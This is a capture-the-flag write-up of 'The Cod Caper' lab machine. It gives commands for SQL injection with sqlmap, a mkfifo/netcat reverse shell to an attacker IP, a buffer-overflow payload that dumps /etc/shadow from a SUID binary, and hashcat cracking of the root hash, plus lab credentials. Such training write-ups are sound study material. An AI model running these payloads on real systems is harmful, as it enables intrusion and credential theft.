# CTF Writeup: The Cod Caper

## Overview

This writeup documents the step-by-step exploitation path for "The Cod Caper" machine. The attack chain involves discovering a SQL Injection vulnerability for initial access, establishing a reverse shell, and finally escalating to root privileges by exploiting a buffer overflow in a custom SUID binary.

## 1. Initial Reconnaissance & SQL Injection

During the initial enumeration phase, we discovered a web application input that appeared vulnerable to SQL injection.

<img width="1910" height="410" alt="image" src="https://github.com/user-attachments/assets/f0569f0d-6fb5-4f97-8a6a-df347d883c54" />

Testing the web page parameters confirmed the presence of the vulnerability by triggering database errors:

<img width="1919" height="871" alt="image" src="https://github.com/user-attachments/assets/d48d6bad-f140-457a-86f7-1a41f3b5c282" />

<img width="1851" height="793" alt="image" src="https://github.com/user-attachments/assets/a110abed-dd1c-4a1d-83e3-5c93c8fb95d8" />

<img width="1574" height="810" alt="image" src="https://github.com/user-attachments/assets/4e8eee89-cc1a-4b16-afcc-6bd37b2b873f" />

To automate the exploitation, we intercepted and saved the vulnerable HTTP request to a local file named `rootx`. We then utilized `sqlmap` to enumerate the databases:

```bash
sqlmap -r rootx --dbs --batch 
```

<img width="1420" height="877" alt="image" src="https://github.com/user-attachments/assets/cf2f51be-a8c2-43c2-aff3-53efcc2c5403" />

<img width="1908" height="788" alt="image" src="https://github.com/user-attachments/assets/b9bb3cbb-fd78-4f4b-b52c-606421f89722" />

Once the databases were identified, we targeted the `users` database to extract its contents:

```bash
sqlmap -r rootx -D users --dump  --batch
```

<img width="1851" height="638" alt="image" src="https://github.com/user-attachments/assets/799a5054-1c7e-48f2-9f60-b1280ef4cacc" />

<img width="1491" height="765" alt="image" src="https://github.com/user-attachments/assets/a3559fc2-90d1-43be-97f4-7a5978334782" />

The database dump successfully revealed valid login credentials:

*   **Username:** `pingudad`
*   **Password:** `secretpass`

<img width="1806" height="720" alt="image" src="https://github.com/user-attachments/assets/e47b2a3d-8828-44ec-a471-051e7233f55e" />

## 2. Gaining a Foothold and Stabilizing the Shell

Using the extracted credentials, we successfully logged into the system and gained access to a command execution panel.

<img width="1413" height="826" alt="image" src="https://github.com/user-attachments/assets/7a118506-9e03-42f5-a4c5-65e814ed3aa5" />

To establish a reverse shell back to our attacking machine, we executed a standard `mkfifo` payload:

```bash
mkfifo /tmp/lol;nc 192.168.152.214 4444 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol 
```

<img width="1622" height="767" alt="image" src="https://github.com/user-attachments/assets/7db227f9-e78c-41e3-90d4-f39e405d0067" />

We caught the connection using a netcat listener on our machine:

<img width="1073" height="386" alt="image" src="https://github.com/user-attachments/assets/b4812a56-bbb9-4bf8-bfcb-12e732783288" />

Since reverse shells can be unstable, we upgraded it to a fully interactive TTY session using Python:

```bash
python -c "import pty;pty.spawn('/bin/bash')"
```

<img width="1059" height="784" alt="image" src="https://github.com/user-attachments/assets/e70a16dd-dd15-4a26-8337-e5942cf8954f" />

<img width="1423" height="805" alt="image" src="https://github.com/user-attachments/assets/fe56935f-9d38-406d-8b1e-bc2cc2ca6a5d" />

For a more reliable connection during the post-exploitation phase, we subsequently logged in directly via SSH using the `pingu` user account:

```bash
ssh pingu@10.65.155.101  
```

<img width="1339" height="607" alt="image" src="https://github.com/user-attachments/assets/c056e291-ff3c-4bb3-8a1a-bd218e820ceb" />

## 3. Privilege Escalation (Buffer Overflow)

During our local enumeration for privilege escalation vectors, we searched the file system for SUID binaries and discovered an interesting custom executable.

*   **Target SUID File:** `/opt/secret/root`

<img width="1887" height="597" alt="image" src="https://github.com/user-attachments/assets/ab9ac158-b7f3-477f-b127-0b015feb217f" />

Testing the binary revealed that it was vulnerable to a buffer overflow.

<img width="1884" height="797" alt="image" src="https://github.com/user-attachments/assets/e4708ec2-24d6-465a-84f6-4e27b19c71e7" />

<img width="1254" height="887" alt="image" src="https://github.com/user-attachments/assets/904c7ad3-3e76-4531-8587-1e761bef72fb" />

By carefully crafting a payload with 44 "A" characters for padding, followed by the specific memory address (`0x080484cb`, written in little-endian format as `\xcb\x84\x04\x08`), we altered the execution flow. Running this payload forced the program to dump the contents of the highly restricted `/etc/shadow` file:

```bash
python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root
```

<img width="1814" height="661" alt="image" src="https://github.com/user-attachments/assets/70841850-d679-47e9-961c-b24925664819" />

## 4. Hash Cracking and Root Access

From the dumped `/etc/shadow` output, we successfully extracted the SHA-512 crypt hash for the root user. We saved this hash into a local file named `hash.txt`.

To crack the password, we utilized `hashcat` alongside the `rockyou.txt` wordlist, appending the `-O` flag for optimized performance:

```bash
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt -O
```

<img width="1433" height="774" alt="image" src="https://github.com/user-attachments/assets/6820fe9b-7ae6-4642-83ce-25fb50ae178a" />

The cracking process was successful, revealing the final password.

*   **Root Password:** `love2fish`

Using this password, we can successfully authenticate as root, achieving a full system compromise.